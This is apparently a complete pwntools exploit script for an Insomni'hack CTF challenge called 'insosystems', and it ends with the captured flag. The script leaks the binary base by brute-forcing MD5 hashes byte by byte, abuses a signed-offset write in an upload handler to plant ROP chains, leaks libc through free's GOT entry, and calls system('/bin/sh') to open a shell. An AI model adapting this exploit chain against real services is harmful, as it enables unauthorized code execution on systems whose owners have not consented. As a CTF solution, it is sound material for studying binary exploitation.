#!/usr/bin/env python3

from pwn import *
import random
import hashlib

VERBOSE = True

exe = ELF("./insosystems")

libc = None
if args.REMOTE:
    # libc = ELF("./libc.so")
    libc = ELF("docker/libc.so.6")
else:
    libc = ELF("/path/to/libc.so.6")

context.binary = exe
context.terminal = ["tmux", "new-window"]


def conn():
    if args.REMOTE:
        r = remote("insosystems.insomnihack.ch", 31337)
        # r = remote("127.0.0.1", 31337)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit-gef.py
pie break 0x13bf
c
        """)

AUTH = 0
IS_LOGGED = 1
UPLOAD = 2
READ_FILE = 3
EXIT = 4

def pause():
    if args.GDB:
        input("pause")
    else:
        time.sleep(2)

def f(data):
    ret = b"|"
    for f in data:
        if isinstance(f, bytes):
            ret += f
        else:
            ret += str(f).encode()
        ret += b"|"
    return ret

def recv_msg():
    r.recvuntil(b"|")
    code = int(r.recvuntil(b"|", drop=True))
    size = int(r.recvuntil(b"|", drop=True))
    data = r.recv(size)
    r.recvuntil(b"|")
    ret = {"code":code, "size":size, "data":data}
    if VERBOSE: print(ret)
    return ret

def auth():
    r.send(f([AUTH, 3]))
    pause()

def is_logged():
    r.send(f([IS_LOGGED]))
    return recv_msg()["data"] == b"You are logged in"

def upload(filename_len, filename, size, data):
    r.send(f([UPLOAD, filename_len, filename, size]) + data)
    return recv_msg()["data"]

def read_file(filename):
    r.send(f([READ_FILE, len(filename), filename]))
    return recv_msg()["data"]


def rel_write(offset, data, pwned=False):
    if offset < 0:
        r.send(f([UPLOAD,
                  len("write"),
                  b"write",
                  0x1004])
               + b"A"*0x1000 + p32(offset - (0x1004 % 1000), sign="signed"))
        pause()
        r.send(data.ljust(0x1000 - offset, b"A") + p32(0x133700)) # big value
        pause()
    else:
        r.send(f([UPLOAD,
                  len("write"),
                  b"write",
                  offset + len(data)])
               + b"A"*0x1000 + p32(offset - (0x1004 % 1000), sign="signed"))
        pause() 
        r.send(data)
    if not pwned:
        msg = recv_msg()
        return msg["data"]


def main():
    global r

    r = conn()
    attach_gdb()

    auth()
    assert is_logged()
    upload(4, b"toto", 4, b"hey")
    read_file(b"toto")


    """
    " leak exe
    """
    hashes = []
    for i in range(8):
        path = upload(0x20 + 8 - i, b"abcd", 1, b"x")
        hashes.append(path)

    leak = b""
    for target in hashes[::-1]:
        for bf in range(0x100):
            b = bytes([bf])
            h = hashlib.md5()
            h.update(b"abcd".ljust(0x18, b"\x00") + p64(0x21) + leak + b)
            if target == h.hexdigest().encode():
                leak += bytes([bf])
                break

    exe.address = u64(leak) - 0x142b
    print(f"exe @ {hex(exe.address)}")


    """
    " rop
    """
    exe_info = exe.address + 0xe27
    exe_main = exe.address + 0x1a33


    print(f"bss @ {hex(exe.bss())}")
    rop = ROP(exe)
    rop.raw(rop.find_gadget(["ret"])) # movaps issue
    rop.call(exe_info, [exe.got["free"]])
    # rop.raw(rop.find_gadget(["ret"])) # movaps issue
    rop.call(exe_main)

    leak = rel_write(-0x38, rop.chain())
    leak = u64(leak.ljust(8, b"\x00"))

    print(f"free @ {hex(leak)}")

    libc.address = leak - libc.sym["free"]
    print(f"libc @ {hex(libc.address)}")


    rop = ROP(libc)
    # rop.raw(rop.find_gadget(["ret"])) # movaps issue
    rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
    rel_write(-0x38, rop.chain(), pwned=True)
    # rel_write(0x1078, rop.chain(), pwned=True)

    """
    " leak stack
    """
    # leak = rel_write(0x1030, b"X") # remove null byte from filename_hash -> leak
    # if args.GDB:
        # leak = (u64(leak[33:].ljust(8, b"\x00")) << 8) | int(input("byte: "), 16)
    # else:
        # leak = (u64(leak[33:].ljust(8, b"\x00")) << 8) | (8 * random.randint(0, 256//8))
    # addr_buffer = leak - 0x11c8
    # print(f"buffer @ {hex(addr_buffer)}")


    r.interactive()


if __name__ == "__main__":
    main()


# INS{I_Don't_tRu5t_your_Find1nGs!}
